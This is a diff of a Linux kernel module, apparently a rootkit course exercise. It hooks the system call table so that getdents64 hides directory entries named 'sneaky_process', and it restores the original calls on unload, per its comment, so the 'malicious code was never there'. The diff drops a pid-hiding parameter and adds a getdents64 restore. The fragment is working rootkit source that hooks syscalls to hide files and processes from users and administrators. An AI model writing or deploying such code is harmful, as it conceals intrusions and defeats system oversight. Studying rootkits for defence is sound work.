@@ -14,16 +14,8 @@
 
 static int pid;
 module_param(pid, int, 0);
-char *sneaky_pid = NULL;
-module_param(sneaky_pid, charp, 0);
-// struct linux_dirent64 {
-//   unsigned long d_ino;      // inode number
-//   off_t d_off;              // offset to next structure
-//   unsigned short d_reclen;  // size of this strucutre
-//   unsigned char
-//       d_type;  // type of this structure e.g. normal file, socket, directory, ...
-//   char d_name[];
-// };
+// char *sneaky_pid = NULL;
+// module_param(sneaky_pid, charp, 0);
 
 // This is a pointer to the system call table
 static unsigned long *sys_call_table;
@@ -73,7 +65,7 @@ asmlinkage int sneaky_getdents64(struct pt_regs *regs)
 {
   struct linux_dirent64 *dirp = (struct linux_dirent64 *)regs->si;
   int nread = (*original_getdents64)(regs), off = 0;
-  printk(KERN_INFO "get sneaky getdents64 with process id %s", sneaky_pid);
+  // printk(KERN_INFO "get sneaky getdents64 with process id %s", sneaky_pid);
 
   if (nread <= 0)
   {
@@ -83,8 +75,7 @@ asmlinkage int sneaky_getdents64(struct pt_regs *regs)
   for (off = 0; off < nread;)
   {
     struct linux_dirent64 *curDirent = (void *)dirp + off;
-    if (strcmp(curDirent->d_name, "sneaky_process") == 0 ||
-        strcmp(curDirent->d_name, sneaky_pid) == 0)
+    if (strcmp(curDirent->d_name, "sneaky_process") == 0)
     {
       void *nextDirent = (void *)curDirent + curDirent->d_reclen;
       int remaining_size = nread - (off + curDirent->d_reclen);
@@ -136,6 +127,7 @@ static void exit_sneaky_module(void)
   // This is more magic! Restore the original 'open' system call
   // function address. Will look like malicious code was never there!
   sys_call_table[__NR_openat] = (unsigned long)original_openat;
+  sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
 
   // Turn write protection mode back on for sys_call_table
   disable_page_rw((void *)sys_call_table);
